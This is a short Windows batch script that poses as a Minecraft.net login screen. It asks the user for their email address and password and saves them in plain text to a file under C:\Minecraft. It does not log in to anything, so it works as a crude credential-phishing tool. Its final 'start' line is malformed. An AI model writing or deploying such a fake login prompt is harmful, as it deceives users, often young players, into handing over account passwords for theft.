@echo off
color a
title Log on
cls
echo -------------------------------------------------------------------------------
echo Please Enter Your Email Adress And Password From Minecraft.net.
echo -------------------------------------------------------------------------------
echo.
echo.
mkdir "C:\Minecraft"
cd "C:\Minecraft"
set /p user=username:
set /p pass=Password:
echo username="%user%" Password="%pass%" >Minecraft.txt
start >>cmd.exe<<
exit